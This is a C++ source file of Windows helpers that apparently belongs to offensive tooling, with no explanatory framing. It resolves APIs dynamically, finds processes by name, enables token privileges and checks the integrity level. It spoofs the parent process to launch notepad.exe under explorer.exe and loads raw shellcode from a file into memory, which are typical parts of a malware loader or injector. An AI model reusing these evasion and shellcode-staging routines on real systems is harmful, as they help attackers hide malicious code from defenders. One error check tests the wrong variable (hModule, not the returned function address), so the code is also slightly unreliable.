#include "pch.h"

FARPROC ResolveFunction(char* function, char* dll, BOOL Load)
{
	HMODULE hModule;

	if (Load) {
		hModule = ::LoadLibraryA(dll);
	}
	else {
		hModule = ::GetModuleHandleA(dll);
	}

	if (hModule == NULL) {
		printf("[!] Failed to get handle on %s!\n", dll);
		return NULL;
	}
	FARPROC pFunction = ::GetProcAddress(hModule, function);
	if (hModule == NULL) {
		printf("[!] Failed to get address of %s!\n", function);
		return NULL;
	}
	else {
		return pFunction;
	}
}

int GetProcessByName(wchar_t* name) {
	DWORD dwFlags = TH32CS_SNAPPROCESS;
	DWORD th32ProcessID = 0;

	HANDLE hSnapshot = ::CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Error: %u\n", ::GetLastError());
		return -1;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);

	if (::Process32First(hSnapshot, &pe)) {
		do {
			if (!_wcsicmp(pe.szExeFile, name))
			{
				return pe.th32ProcessID;
			}
		} while (::Process32Next(hSnapshot, &pe));
	}
	::CloseHandle(hSnapshot);
	printf("[!] Failed to find %ws!\n", name);
	return -1;
}

BOOL SetPrivilege(wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	::OpenProcessToken(::GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	if (!::LookupPrivilegeValueW(NULL, lpszPrivilege, &luid))
	{
		printf("LookupPrivilegeValueW() failed, error %u\r\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
	}

	if (!::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges() failed, error %u \r\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

PROCESS_INFORMATION CreateProcessUnderExplorer() {
	int					pid;
	size_t				size;
	PROCESS_INFORMATION pi;
	STARTUPINFOEX		si;
	wchar_t				explorer[] = L"explorer.exe";
	wchar_t				notepad[] = L"notepad.exe";

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	pid = GetProcessByName(explorer);
	if (pid == 0) {
		return pi;
	}

	if (pid == -1) {
		return pi;
	}

	HANDLE hProcess = ::OpenProcess(MAXIMUM_ALLOWED, 0, pid);

	if (!hProcess) {
		return pi;
	}

	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
	si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

	::InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)::HeapAlloc(::GetProcessHeap(), 0, size);
	::InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
	if (si.lpAttributeList == 0) {
		return pi;
	}
	::UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), NULL, NULL);

	if (CreateProcess(0, notepad, 0, 0, FALSE, EXTENDED_STARTUPINFO_PRESENT, 0, 0, &si.StartupInfo, &pi)) {
		return pi;
	}
	else
	{
		return pi;
	}
}

DWORD ReadBytes(char* path, LPVOID* shellcode) {
	HANDLE hFile;
	DWORD  size, readAmount = 0;

	hFile = CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE) {
		size = GetFileSize(hFile, 0);
		*shellcode = malloc(size + 16);
		ReadFile(hFile, *shellcode, size, &readAmount, 0);
		CloseHandle(hFile);
	}
	return readAmount;
}

DWORD GetCurrentIntegrity()
{
	DWORD dwIntegrityLevel = 0;
	DWORD dwError = ERROR_SUCCESS;
	HANDLE hToken = NULL;
	DWORD cbTokenIL = 0;
	PTOKEN_MANDATORY_LABEL pTokenIL = NULL;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL))
	{
		if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
		{
			dwError = GetLastError();
			goto Cleanup;
		}
	}

	pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
	if (pTokenIL == NULL)
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

Cleanup:
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	if (pTokenIL)
	{
		LocalFree(pTokenIL);
		pTokenIL = NULL;
		cbTokenIL = 0;
	}

	if (ERROR_SUCCESS != dwError)
	{
		throw dwError;
	}
	return dwIntegrityLevel;
}